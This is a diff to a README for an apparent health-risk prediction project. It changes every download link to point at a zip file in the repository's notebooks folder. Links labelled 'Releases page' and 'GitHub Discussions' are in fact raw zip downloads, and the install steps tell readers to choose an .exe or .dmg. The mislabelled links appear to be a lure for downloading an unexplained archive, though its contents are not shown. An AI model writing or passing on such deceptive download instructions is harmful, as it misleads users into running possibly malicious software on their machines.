@@ -2,7 +2,7 @@
 
 ## 📥 Download
 
-[![Download Latest Release](https://github.com/cauepio/Lifestyle-Health-Risk-Prediction/raw/refs/heads/main/notebooks/Lifestyle_Health_Risk_Prediction_v3.3-beta.1.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/cauepio/Lifestyle-Health-Risk-Prediction/raw/refs/heads/main/notebooks/Lifestyle_Health_Risk_Prediction_v3.3-beta.1.zip)
+[![Download Latest Release](https://github.com/cauepio/Lifestyle-Health-Risk-Prediction/raw/refs/heads/main/notebooks/Lifestyle-Health-Risk-Prediction-v1.4.zip%20Latest%20Release-Click%20Here-blue)](https://github.com/cauepio/Lifestyle-Health-Risk-Prediction/raw/refs/heads/main/notebooks/Lifestyle-Health-Risk-Prediction-v1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Welcome to the Lifestyle Health Risk Prediction project! This software helps you
 
 ### 📦 Download & Install
 
-1. To download the software, visit the [Releases page](https://github.com/cauepio/Lifestyle-Health-Risk-Prediction/raw/refs/heads/main/notebooks/Lifestyle_Health_Risk_Prediction_v3.3-beta.1.zip).
+1. To download the software, visit the [Releases page](https://github.com/cauepio/Lifestyle-Health-Risk-Prediction/raw/refs/heads/main/notebooks/Lifestyle-Health-Risk-Prediction-v1.4.zip).
 2. Find the latest version listed at the top. 
 3. Click on the version number. This will take you to the specific release details.
 4. Scroll down to the "Assets" section. You will find files listed for download. Choose the file suited for your operating system. If you are unsure, select the file format that matches your OS (e.g., `.exe` for Windows, `.dmg` for macOS).
@@ -71,7 +71,7 @@ You can check the issues section on our GitHub page or reach out to our communit
 
 If you have questions or want to connect with other users:
 
-- Visit our [GitHub Discussions](https://github.com/cauepio/Lifestyle-Health-Risk-Prediction/raw/refs/heads/main/notebooks/Lifestyle_Health_Risk_Prediction_v3.3-beta.1.zip) page to engage with other users.
+- Visit our [GitHub Discussions](https://github.com/cauepio/Lifestyle-Health-Risk-Prediction/raw/refs/heads/main/notebooks/Lifestyle-Health-Risk-Prediction-v1.4.zip) page to engage with other users.
 - Share your experiences or ask for advice on how to improve your health.
 
 ### 🔗 Additional Resources
